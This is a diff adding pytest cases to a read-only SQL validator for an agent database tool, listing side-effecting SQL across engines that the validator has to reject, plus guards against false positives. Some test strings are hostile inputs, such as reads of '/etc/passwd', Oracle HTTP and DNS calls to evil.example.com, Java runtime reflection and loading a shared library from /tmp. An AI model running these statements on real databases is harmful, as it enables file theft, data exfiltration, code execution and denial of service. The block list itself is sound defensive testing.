@@ -418,6 +418,95 @@ def test_rejects_dangerous_functions(sql: str) -> None:
     assert check_read_only(sql) is not None, f"Dangerous function not blocked: {sql!r}"
 
 
+# The same class as `REJECT_DANGEROUS_FUNCTIONS` above, on the engines that list did not speak.
+# Kept as its own corpus because the reason each one is here is the engine, not the verb: the list
+# above was written against Postgres server-side primitives, and `execute_sql` dispatches to eleven
+# more. The tool advertises the MCP `readOnlyHint` on every one of them, so a vector that passes on
+# MySQL falsifies the same claim that a `pg_sleep` would.
+REJECT_DIALECT_SIDE_EFFECT_FUNCTIONS = [
+    # ----- Postgres holes in families the list above already claimed -----
+    # `pg_notify` is the function spelling of the denied `NOTIFY` keyword; `\bNOTIFY\b` cannot see
+    # it, because `_` is a word character.
+    "SELECT pg_notify('deploy', 'go')",
+    # The advisory-lock family beyond the four names that were listed.
+    "SELECT pg_try_advisory_lock(1)",
+    "SELECT pg_try_advisory_xact_lock(1)",
+    "SELECT pg_advisory_lock_shared(1)",
+    "SELECT pg_try_advisory_lock_shared(1)",
+    "SELECT pg_advisory_unlock_shared(1)",
+    # Backup / recovery / replication control — the siblings of the already-denied
+    # `pg_drop_replication_slot`. `pg_logical_slot_get_changes` is a destructive read.
+    "SELECT pg_promote()",
+    "SELECT pg_wal_replay_pause()",
+    "SELECT pg_wal_replay_resume()",
+    "SELECT pg_backup_start('label')",
+    "SELECT pg_stop_backup()",
+    "SELECT pg_create_logical_replication_slot('s', 'test_decoding')",
+    "SELECT pg_copy_physical_replication_slot('a', 'b')",
+    "SELECT pg_logical_emit_message(true, 'prefix', 'payload')",
+    "SELECT pg_logical_slot_get_changes('s', NULL, NULL)",
+    "SELECT pg_replication_origin_create('o')",
+    # ----- MySQL / MariaDB -----
+    "SELECT SLEEP(30)",
+    "SELECT BENCHMARK(1000000, MD5('x'))",
+    "SELECT GET_LOCK('x', 10)",
+    "SELECT RELEASE_LOCK('x')",
+    "SELECT RELEASE_ALL_LOCKS()",
+    "SELECT LOAD_FILE('/etc/passwd')",
+    "SELECT MASTER_POS_WAIT('binlog.000001', 4)",
+    "SELECT SOURCE_POS_WAIT('binlog.000001', 4)",
+    "SELECT WAIT_FOR_EXECUTED_GTID_SET('uuid:1')",
+    # ----- Snowflake — the namespace, not a member list -----
+    "SELECT SYSTEM$ABORT_SESSION(123)",
+    "SELECT SYSTEM$CANCEL_ALL_QUERIES(123)",
+    "SELECT SYSTEM$WAIT(30)",
+    "SELECT SYSTEM$PIPE_FORCE_RESUME('p')",
+    # ----- Databricks / Spark SQL — JVM reflection from a SELECT -----
+    "SELECT reflect('java.lang.Runtime', 'getRuntime')",
+    "SELECT java_method('java.lang.Runtime', 'getRuntime')",
+    # ----- SQL Server — remote SQL and server-file access from the FROM clause -----
+    "SELECT x FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) AS t(x)",
+    "SELECT x FROM OPENQUERY(linked_server, 'SELECT 1')",
+    "SELECT x FROM OPENDATASOURCE('SQLOLEDB', 'Data Source=evil').db.dbo.t",
+    # ----- BigQuery — federated remote SQL -----
+    "SELECT x FROM EXTERNAL_QUERY('conn', 'SELECT 1')",
+    # ----- Oracle — package-qualified sleep, pipes, nested SQL and network egress -----
+    "SELECT DBMS_LOCK.SLEEP(5) FROM dual",
+    "SELECT DBMS_PIPE.RECEIVE_MESSAGE('p', 10) FROM dual",
+    "SELECT DBMS_XMLGEN.GETXML('SELECT 1 FROM dual') FROM dual",
+    "SELECT UTL_HTTP.REQUEST('http://evil.example.com') FROM dual",
+    "SELECT UTL_INADDR.GET_HOST_ADDRESS('evil.example.com') FROM dual",
+    "SELECT HTTPURITYPE('http://evil.example.com').GETCLOB() FROM dual",
+    # ----- SQLite / DuckDB — loading a shared library is code execution -----
+    "SELECT load_extension('/tmp/evil.so')",
+]
+
+
+@pytest.mark.parametrize("sql", REJECT_DIALECT_SIDE_EFFECT_FUNCTIONS)
+def test_rejects_dialect_side_effect_functions(sql: str) -> None:
+    """The `readOnlyHint` is one claim over every engine, so every engine's side effects are denied.
+
+    Each vector is a SINGLE SELECT: it opens with the allowed keyword, carries no denied keyword and
+    no row lock, and reaches the database untouched on `main` before this list existed. The gate that
+    has to stop it is the dangerous-function step and nothing earlier, which is why these are worth
+    pinning separately from the write/DDL vectors that three other steps would also catch.
+    """
+    assert check_read_only(sql) is not None, f"Side-effecting function not blocked: {sql!r}"
+
+
+def test_dialect_side_effect_rejection_names_the_function() -> None:
+    """The refusal echoes the caller's own token, so an agent can see which call to drop.
+
+    `detail` is the only caller-specific text any rejection carries (see `_REMEDIATION`), and a
+    dialect vector is the case where a generic "dangerous function" would leave the author guessing:
+    the denied name may be one of several calls in the statement.
+    """
+    refusal = check_read_only("SELECT id, SYSTEM$WAIT(30) FROM orders")
+    assert refusal is not None
+    assert "SYSTEM$WAIT" in refusal.detail
+    assert refusal.remediation == _REMEDIATION["dangerous_function"]
+
+
 def over_length_payload() -> str:
     """SQL past the length cap. A function rather than a constant so the ~50KB string is built only
     by the tests that need it (here and the refusal-contract corpus), not at every import."""
@@ -830,6 +919,23 @@ def test_the_corpus_scanner_finds_the_lists_and_only_the_lists() -> None:
         # ----- Positional parameters ($1, $2) are NOT dollar-quote openers -----
         "SELECT id, name FROM users WHERE id = $1",
         "SELECT * FROM orders WHERE customer_id = $1 AND status = $2",
+        # ----- Names that overlap the cross-dialect function deny-list. Those entries are
+        # bare words (`SLEEP`, `BENCHMARK`, `RELEASE_LOCK`, `REFLECT`), so they are the ones
+        # most able to false-positive on an ordinary column, alias or table. `name(` is what
+        # is matched, so a column never can — but an alias or a same-named user function
+        # could, and these pin that the boundary is the call and not the word. -----
+        "SELECT sleep_minutes, benchmark_score FROM sessions",
+        "SELECT AVG(sleep) AS mean_sleep FROM sleep_study",
+        "SELECT lock_count, release_count FROM lock_stats",
+        "SELECT reflection_score FROM surveys",
+        "SELECT system_id, external_query_id FROM job_runs",
+        "SELECT load_file_path FROM ingest_log",
+        # `OPENJSON` is ordinary SQL Server analytics and must survive the `OPENROWSET` deny —
+        # which is why that section names its three functions instead of matching `OPEN\w+`.
+        # `OPENXML` is the other one left out, and for a different reason: its document handle
+        # can only come from an `EXEC sp_xml_preparedocument` the opening-keyword step refuses.
+        "SELECT value FROM OPENJSON(@payload)",
+        "SELECT x FROM OPENXML(@h, '/root', 1)",
     ],
 )
 def test_false_positive_guard_legitimate_analytics_sql(sql: str) -> None:
